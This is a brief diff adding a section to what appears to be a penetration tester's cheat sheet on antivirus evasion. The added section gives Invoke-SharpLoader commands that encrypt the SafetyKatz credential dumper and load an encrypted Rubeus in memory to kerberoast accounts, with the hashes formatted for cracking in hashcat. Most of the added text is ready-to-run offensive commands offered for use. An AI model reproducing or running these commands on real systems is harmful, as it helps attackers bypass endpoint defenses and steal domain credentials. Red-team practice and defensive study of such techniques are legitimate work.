@@ -13,6 +13,20 @@ Poggy simple sig based evasion
 https://luemmelsec.github.io/Circumventing-Countermeasures-In-AD/
 
 
+***
+SharpLoader
+https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
+
+```powershell
+Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
+```
+```powershell
+Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"
+```
+***
+
+
+
 ****
 Shortcut with powershell
 ```
